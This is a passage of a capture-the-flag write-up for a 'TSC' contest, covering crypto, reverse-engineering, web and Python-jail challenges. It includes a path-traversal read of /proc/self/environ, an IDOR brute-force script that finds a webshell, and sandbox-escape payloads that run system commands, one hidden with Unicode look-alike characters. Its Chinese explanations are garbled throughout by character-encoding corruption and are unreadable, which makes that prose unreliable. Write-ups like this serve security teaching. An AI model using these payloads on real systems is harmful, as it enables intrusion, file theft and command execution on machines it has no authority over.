class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">p = <span class="number">42899</span></span><br><span class="line">hashes = [<span class="number">1934</span>, <span class="number">22627</span>, <span class="number">36616</span>, <span class="number">21343</span>]</span><br><span class="line">ciphertext = <span class="string">b'z\xa5\xa5\x1d\xe5\xd2I\xb1\x15\xec\x95\x8b^\xb6:r=\xe3h\x06-\xe9\x01\xda\xc03\xa4\xf6\xa8_\x8c\x12!MZP\x17O\xee\xa3\x0f\x05\x0b\xea7cnP'</span></span><br><span class="line"></span><br><span class="line">good = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r4 <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">    A = Matrix([</span><br><span class="line">        [<span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">        [<span class="number">15</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">36</span>],</span><br><span class="line">        [<span class="number">140</span>, <span class="number">250</span>, <span class="number">291</span>, <span class="number">244</span>],</span><br><span class="line">        [<span class="number">1050</span>,<span class="number">1820</span>,<span class="number">1980</span>,<span class="number">1476</span>]</span><br><span class="line">    ])</span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mod_sub</span>(<span class="params">a, b</span>): <span class="keyword">return</span> (a - b) % p</span><br><span class="line">    </span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">0</span>], <span class="number">5</span>*r4 + <span class="number">84</span>))</span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">1</span>], <span class="number">25</span>*r4 + <span class="number">1343</span>))</span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">2</span>], <span class="number">125</span>*r4 + <span class="number">13072</span>))</span><br><span class="line">    B.append(mod_sub(hashes[<span class="number">3</span>], <span class="number">625</span>*r4 + <span class="number">100948</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve in modular arithmetic</span></span><br><span class="line">    <span class="comment"># sympy's solve for modular is not direct; try invert or reduce:</span></span><br><span class="line">    M = A.det() % p</span><br><span class="line">    <span class="keyword">if</span> M == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        invA = A.inv_mod(p)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sol = invA * Matrix(B)</span><br><span class="line">    r0, r1, r2, r3 = [<span class="built_in">int</span>(x) % p <span class="keyword">for</span> x <span class="keyword">in</span> sol]</span><br><span class="line"></span><br><span class="line">    r = [r0, r1, r2, r3, r4]</span><br><span class="line">    flag = <span class="string">'TSC{}'</span>.encode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        h = flag[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            h = (h + (j+<span class="number">1</span>) * r[j]) % p</span><br><span class="line">            r[j] = h</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> rr <span class="keyword">in</span> r:</span><br><span class="line">        key += rr</span><br><span class="line">        key *= <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    key = pad(long_to_bytes(key), <span class="number">16</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted = aes.decrypt(ciphertext).decode()</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">'TSC{'</span>):</span><br><span class="line">            <span class="built_in">print</span>(decrypted)</span><br><span class="line">            <span class="built_in">print</span>(r0, r1, r2, r3, r4)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{d0_4_L1feTim3_0f_crypTogr4phy_w1th_yOu}</code></p><h2 id="reverse">Reverse <a href="#reverse" class="headerlink"></a></h2><h3 id="what_happened">What_Happened <a href="#what_happened" class="headerlink"></a></h3><p>ç”¨ gdb å¾—åˆ°äº†è€…å€‹å’šå’š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s &amp;flag_encrypted</span><br><span class="line">0x405064 &lt;flag_encrypted&gt;:      "\376\371\351\321\343\365\376\302\303\304\301\365\323\305\337\365\354\303\322\365\230\305\307\317\365\231\330\330\305\330\327Decrypted Flag: %s\n"</span><br></pre></td></tr></tbody></table></figure><p>ç„¶å¾Œçœ‹äº†ä¸€ä¸‹ decrypt çš„é‚è¼¯</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble decrypt_flag</span><br><span class="line">Dump of assembler code for function decrypt_flag:</span><br><span class="line">   0x004014af &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x004014b0 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x004014b2 &lt;+3&gt;:     sub    $0x58,%esp</span><br><span class="line">   0x004014b5 &lt;+6&gt;:     movl   $0x405064,(%esp)</span><br><span class="line">   0x004014bc &lt;+13&gt;:    call   0x403b28 &lt;strlen&gt;</span><br><span class="line">   0x004014c1 &lt;+18&gt;:    mov    %eax,-0x10(%ebp)</span><br><span class="line">   0x004014c4 &lt;+21&gt;:    movl   $0x0,-0xc(%ebp)</span><br><span class="line">   0x004014cb &lt;+28&gt;:    jmp    0x4014eb &lt;decrypt_flag+60&gt;</span><br><span class="line">   0x004014cd &lt;+30&gt;:    mov    -0xc(%ebp),%eax</span><br><span class="line">   0x004014d0 &lt;+33&gt;:    add    $0x405064,%eax</span><br><span class="line">   0x004014d5 &lt;+38&gt;:    movzbl (%eax),%eax</span><br><span class="line">   0x004014d8 &lt;+41&gt;:    xor    $0xffffffaa,%eax</span><br><span class="line">   0x004014db &lt;+44&gt;:    mov    %eax,%ecx</span><br><span class="line">   0x004014dd &lt;+46&gt;:    lea    -0x42(%ebp),%edx</span><br><span class="line">   0x004014e0 &lt;+49&gt;:    mov    -0xc(%ebp),%eax</span><br><span class="line">   0x004014e3 &lt;+52&gt;:    add    %edx,%eax</span><br><span class="line">   0x004014e5 &lt;+54&gt;:    mov    %cl,(%eax)</span><br><span class="line">   0x004014e7 &lt;+56&gt;:    addl   $0x1,-0xc(%ebp)</span><br><span class="line">   0x004014eb &lt;+60&gt;:    mov    -0xc(%ebp),%eax</span><br><span class="line">   0x004014ee &lt;+63&gt;:    cmp    -0x10(%ebp),%eax</span><br><span class="line">   0x004014f1 &lt;+66&gt;:    jl     0x4014cd &lt;decrypt_flag+30&gt;</span><br><span class="line">   0x004014f3 &lt;+68&gt;:    lea    -0x42(%ebp),%edx</span><br><span class="line">   0x004014f6 &lt;+71&gt;:    mov    -0x10(%ebp),%eax</span><br><span class="line">   0x004014f9 &lt;+74&gt;:    add    %edx,%eax</span><br><span class="line">   0x004014fb &lt;+76&gt;:    movb   $0x0,(%eax)</span><br><span class="line">   0x004014fe &lt;+79&gt;:    lea    -0x42(%ebp),%eax</span><br><span class="line">   0x00401501 &lt;+82&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x00401505 &lt;+86&gt;:    movl   $0x405083,(%esp)</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--c</span><br><span class="line">   0x0040150c &lt;+93&gt;:    call   0x403b60 &lt;printf&gt;</span><br><span class="line">   0x00401511 &lt;+98&gt;:    nop</span><br><span class="line">   0x00401512 &lt;+99&gt;:    leave</span><br><span class="line">   0x00401513 &lt;+100&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>å¯æ˜¯æˆ‘çœ‹ä¸æ‡‚ï¼Œä¸é ChatGPT è·Ÿæˆ‘èªªä»–æ˜¯æŠŠæ¯å€‹å­—æ‹¿å»è·Ÿ <code>0x44</code>xor çš„çµæœï¼Œè©¦äº†ä¸€ä¸‹å°±å¾—åˆ° flag äº†</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">encrypted_flag = [</span><br><span class="line">    <span class="number">0xFE</span>, <span class="number">0xF9</span>, <span class="number">0xE9</span>, <span class="number">0xD1</span>, <span class="number">0xE3</span>, <span class="number">0xF5</span>, <span class="number">0xFE</span>, <span class="number">0xC2</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0xF5</span>, <span class="number">0xD3</span>, <span class="number">0xC5</span>, <span class="number">0xDF</span>, <span class="number">0xF5</span>, <span class="number">0xEC</span>, <span class="number">0xC3</span>, <span class="number">0xD2</span>, <span class="number">0xF5</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0xC5</span>, <span class="number">0xC7</span>, <span class="number">0xCF</span>, <span class="number">0xF5</span>, <span class="number">0x99</span>, <span class="number">0xD8</span>, <span class="number">0xD8</span>, <span class="number">0xC5</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0xD7</span></span><br><span class="line">]</span><br><span class="line">key = <span class="number">0xAA</span></span><br><span class="line">decrypted_flag = <span class="string">''</span>.join(<span class="built_in">chr</span>(byte ^ key) <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_flag)</span><br><span class="line"><span class="built_in">print</span>(decrypted_flag)</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{I_Think_you_Fix_2ome_3rror}</code></p><h3 id="gateway-to-the-reverse">Gateway to the Reverse <a href="#gateway-to-the-reverse" class="headerlink"></a></h3><p>éš¨ä¾¿äº‚å¸¶å·¥å…·è©¦è©¦çœ‹ï¼Œæˆ‘æ ¹æœ¬ä¸æœƒ Reverse å°±å‡º flag äº†</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace ./gate</span><br><span class="line">puts("================================"...=============================================</span><br><span class="line">)                                                                                   = 46</span><br><span class="line">puts("You stand before the Gate of the"...You stand before the Gate of the Reverse World.</span><br><span class="line">)                                                                                   = 48</span><br><span class="line">puts("A voice echoes from the darkness"...A voice echoes from the darkness:</span><br><span class="line"></span><br><span class="line">)                                                                                   = 35</span><br><span class="line">puts("  "Beyond this gate lies the Rev"...  "Beyond this gate lies the Reverse World, a realm</span><br><span class="line">)                                                                                   = 52</span><br><span class="line">puts("   of infinite knowledge and unt"...   of infinite knowledge and untold secrets.</span><br><span class="line">)                                                                                   = 45</span><br><span class="line">puts("   But only those who can deciph"...   But only those who can decipher the key may enter."</span><br><span class="line"></span><br><span class="line">)                                                                                   = 56</span><br><span class="line">puts("The gatekeeper continues:"The gatekeeper continues:</span><br><span class="line">)                                                                                             = 26</span><br><span class="line">puts("  "Reveal today's lucky number, "...  "Reveal today's lucky number, and the gate shall open."</span><br><span class="line">)                                                                                   = 58</span><br><span class="line">puts("================================"...=============================================</span><br><span class="line">)                                                                                   = 46</span><br><span class="line">printf("\nEnter the access key: "</span><br><span class="line">)                                                                                            = 23</span><br><span class="line">__isoc99_scanf(0x562eca2c637c, 0x7ffc3c3130b0, 0, 0x562eca2c637bEnter the access key: sadfsd</span><br><span class="line">)                                                             = 1</span><br><span class="line">strlen("NL=rje+fS&amp;eVP!RdK\177=e;{y6CG4Aif")                                                                                   = 30</span><br><span class="line">strcmp("sadfsd", "TSC{th1s_1s_b4by_r3v3rs3_b4by}")                                                                            = 31</span><br><span class="line">puts("  +===========================+"  +===========================+</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||                         ||"  ||                         ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||      [  LOCKED  ]       ||"  ||      [  LOCKED  ]       ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||                         ||"  ||                         ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||   The gate remains      ||"  ||   The gate remains      ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||       firmly shut.      ||"  ||       firmly shut.      ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  ||                         ||"  ||                         ||</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("  +===========================+"  +===========================+</span><br><span class="line">)                                                                                       = 32</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("       ||             ||"       ||             ||</span><br><span class="line">)                                                                                              = 25</span><br><span class="line">puts("The gatekeeper's voice booms:"The gatekeeper's voice booms:</span><br><span class="line">)                                                                                         = 30</span><br><span class="line">puts("  "Your answer is incorrect. The"...  "Your answer is incorrect. The gate shall remain closed."</span><br><span class="line">)                                                                                   = 60</span><br><span class="line">puts("  "Return when you have decipher"...  "Return when you have deciphered the true key."</span><br><span class="line">)                                                                                   = 50</span><br><span class="line">+++ exited (status 0) +++</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{th1s_1s_b4by_r3v3rs3_b4by}</code></p><h2 id="web">Web <a href="#web" class="headerlink"></a></h2><h3 id="ave-mujica">Ave Mujica <a href="#ave-mujica" class="headerlink"></a></h3><p>ç™¼ç¾é€™é¡Œå¯ä»¥åœ¨ <code>/image?name=</code> Path Traversal è©¦äº†å¾ˆä¹…ï¼Œåœ¨<code>../../../proc/self/environ</code> æ‰¾åˆ°äº† Flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=acfe70c044b5FLAG=TSC{æ•¬æ„›çˆ½ğŸ·}LANG=C.UTF-8GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305PYTHON_VERSION=3.12.8PYTHON_SHA256=c909157bb25ec114e5869124cc2a9c4a4d4c1e957ca4ff553f1edc692101154eHOME=/root</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{æ•¬æ„›çˆ½ğŸ·}</code></p><h3 id="be_idol">Be_IDol <a href="#be_idol" class="headerlink"></a></h3><p>æª¢æŸ¥ä¹‹å¾Œç™¼ç¾è£¡é¢æœ‰å€‹å¾Œé–€</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Backdoor function - ez_login()</span><br><span class="line">function ez_login() {</span><br><span class="line">document.cookie = "PHPSESSID=secretbackdoor123";</span><br><span class="line">location.reload();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å°±åœ¨ console ä¸­æ‰“ <code>ex_login()</code> ä¹‹å¾Œå°±åˆ°äº†<code>http://172.31.0.2:8057/index.php</code> ç™¼ç¾æœ‰å¾ˆå¤šæª”æ¡ˆå¯ä»¥ä¸‹è¼‰</p><figure><img data-src="https://hackmd.io/_uploads/ByXXZPMPJl.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>é€šéˆè©¦è©¦çœ‹ä¸Šé¢æ²’æœ‰çš„ ID</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://172.31.0.2:8057/download.php\?file_id\=11001</span><br><span class="line">database:</span><br><span class="line">  host: localhost</span><br><span class="line">  user: admin</span><br><span class="line">  password: [REDACTED]</span><br></pre></td></tr></tbody></table></figure><p>ç™¼ç¾äº†éé æœŸçš„çµæœï¼Œæ–¼æ˜¯æˆ‘å« GPT å¯«äº†å€‹ç¨‹å¼å¹«æˆ‘éæ­· id = 10000~20000çš„æ‰€æœ‰æª”æ¡ˆï¼Œå¦‚æœå›å‚³çµæœä¸æ˜¯ <code>This is a normal file with ID:</code>æˆ– <code>File not found</code> ç‚ºé–‹é ­å°±åˆ—å‡ºä¾†</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šç¾© URL å’Œæª”æ¡ˆ ID ç¯„åœ</span></span><br><span class="line">base_url = <span class="string">"http://172.31.0.2:8057/download.php"</span></span><br><span class="line">start_id = <span class="number">10000</span></span><br><span class="line">end_id = <span class="number">20000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¨˜éŒ„éé æœŸå›æ‡‰</span></span><br><span class="line">unexpected_responses = {}</span><br><span class="line"></span><br><span class="line"><span class="comment"># é–‹å§‹å˜—è©¦ä¸‹è¼‰</span></span><br><span class="line"><span class="keyword">for</span> file_id <span class="keyword">in</span> <span class="built_in">range</span>(start_id, end_id + <span class="number">1</span>):</span><br><span class="line">    params = {<span class="string">"file_id"</span>: file_id}</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(base_url, params=params)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            content = response.text</span><br><span class="line">            <span class="comment"># éæ¿¾é æœŸå…§å®¹</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (content.startswith(<span class="string">"This is a normal file with ID:"</span>) <span class="keyword">or</span> <span class="string">"File not found"</span> <span class="keyword">in</span> content):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[<span class="subst">{file_id}</span>] éé æœŸå…§å®¹"</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line">                unexpected_responses[file_id] = content</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[<span class="subst">{file_id}</span>] è«‹æ±‚å¤±æ•—: <span class="subst">{e}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>ç™¼ç¾äº†å¯èƒ½æœ€æ€ªçš„æ±æ±æ˜¯</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[12001] éé æœŸå…§å®¹</span><br><span class="line">        &lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;title&gt;System Command Interface&lt;/title&gt;</span><br><span class="line">            &lt;style&gt;</span><br><span class="line">                body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }</span><br><span class="line">                pre { background: #2d2d2d; padding: 10px; border-radius: 5px; }</span><br><span class="line">                .output { margin-top: 10px; }</span><br><span class="line">            &lt;/style&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h2&gt;System Command Interface&lt;/h2&gt;</span><br><span class="line">            &lt;form method="GET"&gt;</span><br><span class="line">                &lt;input type="hidden" name="file_id" value="12001"&gt;</span><br><span class="line">                Command: &lt;input type="text" name="cmd" style="width: 300px;" value=""&gt;</span><br><span class="line">                &lt;input type="submit" value="Execute"&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div class="output"&gt;</span><br><span class="line">                &lt;pre&gt;Try some commands:</span><br><span class="line">ls -la</span><br><span class="line">pwd</span><br><span class="line">cat /etc/passwd&lt;/pre&gt;            &lt;/div&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>æ–¼æ˜¯æˆ‘å°±åˆ°<code>http://172.31.0.2:8057/download.php?file_id=12001</code>ç™¼ç¾å¥½åƒæ˜¯å€‹ WebShell ï¼Œç„¶å¾Œéš¨ä¾¿æ‰¾æ‰¾å°±ç™¼ç¾ flag äº† /</p><figure><img data-src="https://hackmd.io/_uploads/B1D5lwGDyg.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag:<code>TSC{You_can_be_ID0R_12353oujhefrgiuoewihoqweihfo}</code></p><h2 id="misc">Misc <a href="#misc" class="headerlink"></a></h2><h3 id="subdomain-hijacking">Subdomain Hijacking <a href="#subdomain-hijacking" class="headerlink"></a></h3><p>å°±éš¨ä¾¿äº‚ç”Ÿæˆä¸€äº› subdomainï¼Œç™¼ç¾å¥½åƒåªæœ‰é–‹é ­å­—æ¯æœƒå¼•éŸ¿ç”Ÿæˆçš„çµæœï¼Œæ‰€ä»¥å°±å¾ a è©¦åˆ° z çœ‹çœ‹ï¼Œè©¦åˆ° tçš„æ™‚å€™ç™¼ç¾ä»–è®Šå¤§å¯«äº†ï¼Ÿ è¶•å¿«æ‹¿å»è©¦è©¦ï¼Œå°±ç™¼ç¾å¾—åˆ° flag äº†</p><figure><img data-src="https://hackmd.io/_uploads/B1jFoyXv1x.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img data-src="https://hackmd.io/_uploads/ByD9s1Xwyl.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag:<code>TSC{hijacking_success_f5a0651d788f466ba0e5e707ebf00f4d}</code></p><h3 id="babyjail">BabyJail <a href="#babyjail" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">'&gt; '</span>), {<span class="string">"__builtins__"</span>: {}}, {}))</span><br></pre></td></tr></tbody></table></figure><p><code>{"__builtins__": {}}</code>æœƒç§»é™¤æ‰€æœ‰å…§å»ºå‡½æ•¸ï¼Œè©¦è‘—å¾èƒ½åŸ·è¡Œç³»çµ±å‘½ä»¤çš„é¡åˆ¥ä¸‹æ‰‹ï¼Œåˆ©ç”¨<code>''.__class__.__base__.__subclasses__()</code> ç™¼ç¾æœ‰å€‹<code>&lt;class 'os._wrap_close'&gt;</code> èƒ½åˆ©ç”¨ä¸€ä¸‹ï¼Œå°±æ“å‡ºäº†ä»¥ä¸‹çš„payload æˆåŠŸå¾—åˆ° flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 172.31.3.2 8002</span><br><span class="line">&gt; ''.__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('cat flag*')</span><br><span class="line">TSC{just_a_classic_nobuiltins_pyjail_for_baby}</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{just_a_classic_nobuiltins_pyjail_for_baby}</code></p><h3 id="calc">calc <a href="#calc" class="headerlink"></a></h3><p>åƒè€ƒäº† <a href="https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass">PyjailCheatSheet çš„ Unicode Bypass</a> è‡ªå·±ä¿®æ”¹è »ä¹…ä¸€ä¸‹ï¼Œå°±æˆåŠŸé€ å‡ºä¸€å€‹ shelläº†</p><p>payload:<code>(ğ˜¥:=()._ï¼¿ğ˜¥ğ˜°ğ˜¤ï¼¿_,ğ˜¥:=()._ï¼¿ğ˜¥ğ˜ªğ˜³ï¼¿_().__ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´__(ğ˜¥),ğ˜´:=ğ˜¥.ğ˜±ğ˜°ğ˜±(19),ğ˜¥._ï¼¿ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ï¼¿_(()._ï¼¿ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ï¼¿_._ï¼¿ğ˜®ğ˜³ğ˜°ï¼¿_).ğ˜±ğ˜°ğ˜±(1)._ï¼¿ğ˜´ğ˜¶ğ˜£ğ˜¤ğ˜­ğ˜¢ğ˜´ğ˜´ğ˜¦ğ˜´ï¼¿_().ğ˜±ğ˜°ğ˜±(121).ğ˜­ğ˜°ğ˜¢ğ˜¥_ğ˜®ğ˜°ğ˜¥ğ˜¶ğ˜­ğ˜¦(ğ˜¥.ğ˜±ğ˜°ğ˜±(33)+ğ˜´).ğ˜´ğ˜ºğ˜´ğ˜µğ˜¦ğ˜®(ğ˜´+ğ˜¥.ğ˜±ğ˜°ğ˜±(54)))</code></p><p>P.S. ä¸çŸ¥é“ç‚ºä»€éº¼é€™å¨å¦‚æœä¸€æ¬¡è¤‡è£½ç›´æ¥è²¼ä¸Šæœ‰äº›å­—æœƒè®Šæˆ (U + FFFD)ï¼Œä½†å¦‚æœåˆ†æ‰¹è¤‡è£½å°±ä¸æœƒ w</p><p>flag:<code>TSC{PEP-3131_is_a_friendly_PEP_for_pyjai1er_nhsdcuhq6}</code></p><h2 id="è£œé¡Œå€">è£œé¡Œå€ <a 